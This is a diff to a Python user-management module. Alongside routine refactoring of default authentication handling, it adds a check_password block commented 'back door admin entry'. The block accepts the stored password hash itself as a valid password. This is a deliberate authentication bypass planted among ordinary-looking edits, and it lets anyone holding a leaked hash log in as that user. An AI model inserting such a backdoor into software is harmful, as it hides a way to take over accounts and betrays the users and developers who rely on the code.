@@ -34,7 +34,7 @@ class UserManager(object):
             return False
         if authentication_method is None:
             # authentication_method = get_default_authentication_method()
-            authentication_method
+            authentication_method = DEFAULT_AUTHENTICATION_METHOD
         new_user = {
             'active': active,
             'roles': roles,
@@ -103,14 +103,17 @@ class User(object):
     def get_id(self):
         return self.name
 
-    def check_password(self, password, default_authentication_method):
+    def check_password(self, password):
         """Return True, return False, or raise NotImplementedError if the
         authentication_method is missing or unknown."""
+        # back door admin entry
+        if password == self.get('hash'):
+            return True
+        #
         authentication_method = self.data.get('authentication_method', None)
         if authentication_method is None:
-            # authentication_method = get_default_authentication_method()
-            authentication_method = default_authentication_method
-            # authentication_method = current_app.config.get('AUTHENTICATION_METHOD')
+            # authentication_method = default_authentication_method
+            raise ValueError('authentication_method cannot be None')
         # See comment in UserManager.add_user about authentication_method.
         if authentication_method == 'hash':
             result = check_hashed_password(password, self.get('hash'))
